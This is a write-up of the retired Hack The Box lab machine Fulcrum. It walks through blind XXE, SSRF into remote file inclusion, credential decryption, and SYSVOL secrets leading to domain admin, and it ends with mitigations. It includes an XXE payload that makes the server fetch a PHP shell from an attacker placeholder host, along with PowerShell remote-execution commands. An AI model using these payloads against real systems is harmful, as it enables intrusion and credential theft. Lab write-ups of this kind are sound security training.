---
machine: Fulcrum
os: Linux
difficulty: Insane
platform: Hack The Box
state: Retired
tags: [linux, xxe, ssrf, pivoting, active-directory]
---

# Fulcrum — Hack The Box (Linux)

**English** | [🇪🇸 Español](README.md)

> **Status:** Retired. Reference writeup; no real flags or credentials.

## TL;DR

The API on 56423 is vulnerable to blind XXE. It is used for SSRF against the upload site on port 4, which allows RFI and execution as `www-data`. A PowerShell script with encrypted credentials provides WinRM access as `WebUser`. LDAP enumeration yields `BTables`, the file server and a SYSVOL script with `923a`, a domain admin on the DC.

## Reconnaissance

```bash
nmap -Pn -p- --min-rate 10000 <IP>
nmap -Pn -sCV -p<PORTS> <IP>
```

```text
4/tcp      http    nginx upload
22/tcp     ssh
80/tcp     http    nginx (502)
88/tcp     http    phpMyAdmin
9999/tcp   http    redirect
56423/tcp  http    Fulcrum-API
```

## Enumeration

- Four nginx sites and an API on 56423 with a `Fulcrum-API` header.
- The API parses XML and returns only `Ping` or `Pong`: blind XXE.
- The upload site on port 4 has a `page` parameter.
- The host has an internal `192.168.122.0/24` segment with Windows.

## Foothold

An external DTD exfiltrates files over HTTP. The API can reach `localhost:4`, whose `page` parameter loads a remote URL; a malicious PHP file is hosted and execution is obtained as `www-data`.

```xml
<?xml version="1.0"?>
<!DOCTYPE data SYSTEM "http://localhost:4/?page=http://<ATTACKER>/shell.php">
<data>&send;</data>
```

## Lateral movement

`/var/www/uploads/Fulcrum_Upload_to_Corp.ps1` contains an encrypted `WebUser` credential. It is decrypted with PowerShell and used with `evil-winrm` through a Chisel tunnel.

From `WebUser`, LDAP users are enumerated. `BTables`' `info` attribute leaks the password; it accesses the file server and the DC SYSVOL.

```powershell
$cred.GetNetworkCredential() | fl
```

## Privilege escalation

SYSVOL holds logon scripts. One contains the password for `923a`, a Domain Admin. `Invoke-Command` or WinRM runs code on the DC as that account and reads the root flag.

```powershell
Select-String -Path '\dc\SYSVOL\*\scripts\*.ps1' -Pattern '923a'
Invoke-Command -ComputerName dc -Credential $cred -ScriptBlock { whoami }
```

## Evidence

- Trimmed output from key commands; no flags, credentials or tokens.
- Real values, when present, live in `private/` and are not published.

## Lessons learned

- Blind XXE is still useful with an external DTD.
- SSRF can connect two services that cannot reach each other directly.
- Automation scripts contain reversible encrypted credentials.
- SYSVOL is domain-readable and often stores secrets.

## Mitigations and detection

- Disable external entities in the XML parser.
- Restrict the `page` parameter to local paths and allowlists.
- Do not store credentials in scripts; use a vault and managed accounts.
- Audit SYSVOL and enforce unique passwords per account.

## References

- [0xdf — Fulcrum](https://0xdf.gitlab.io/2022/05/11/htb-fulcrum.html)
- [Video search (CSV)](https://www.youtube.com/results?search_query=ippsec+fulcrum)
- [Writeup search (CSV)](https://medium.com/search?q=hackthebox+fulcrum+writeup)
